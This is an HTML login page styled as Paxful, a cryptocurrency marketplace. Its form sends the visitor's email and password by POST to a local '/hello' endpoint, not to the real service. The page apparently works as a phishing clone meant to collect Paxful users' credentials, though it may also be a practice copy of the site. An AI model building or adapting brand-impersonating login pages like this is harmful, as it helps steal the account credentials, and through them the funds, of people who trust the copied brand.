<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login</title>
    <style>
        .my-button {
            background: #079407;
            border-radius: 3px;
        }
        body {
            font-family: 'Gill Sans', 'Gill Sans MT', Calibri, 'Trebuchet MS', sans-serif;
            background-color: #050505;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 88vh;
            margin: 0;
        }
        ::placeholder {
            color: white;
            opacity: 0.3;
        }
        .container {
            background-color: black;
            padding: 20px;
            border-radius: 5px;
            width: 300px;
            height: auto;
        }
        .logo {
            display: flex;
            align-items: center;
        }
        .logo img {
            margin-right: 10px;
        }
        h2, h1, h3 {
            color: aliceblue;
            text-align: left;
        }
        h3 a {
            color: aliceblue;
            opacity: 0.6;
        }
        label {
            display: block;
            margin: 10px 0 5px;
            color: rgb(229, 235, 240);
            opacity: 0.8;
        }
        input {
            width: 100%;
            padding: 10px;
            background-color: rgb(13, 14, 14);
            border: 1px solid gray;
            border-radius: 5px;
            color: white;
            margin-bottom: 10px;
        }
        button {
            width: 100%;
            padding: 15px;
            background-color: #e4f046;
            color: rgb(75, 87, 56);
            border-radius: 15px;
            border: none;
            cursor: pointer;
        }
        button:hover {
            background-color: #e4f046;
        }
        #message {
            text-align: center;
            margin-top: 10px;
            color: #079407;
        }
    </style>
</head>
<body>

    <div class="container">
        <div class="logo">
            <img src="pax.png" alt="pax" width="50">
            <h2>Paxful</h2>
        </div>
        <h1>Welcome back!</h1>
        <h3>Don't have an account? <a href="sign.html">Sign up</a></h3>

        <!-- âœ… Fixed: Only one form -->
        <form action="/hello" method="POST">
            <label for="email">Email/Phone number</label>
            <input type="email" id="email" name="email" required placeholder="Email/Phone number" class="box">

            <label for="password">Password</label>
            <input type="password" id="password" name="password" required placeholder="Password" class="box">

            <button type="submit" class="box">Sign in</button>
        
        </form>

        <div id="message"></div>
    </div>

    <script src="script.js"></script>

</body>
</html>
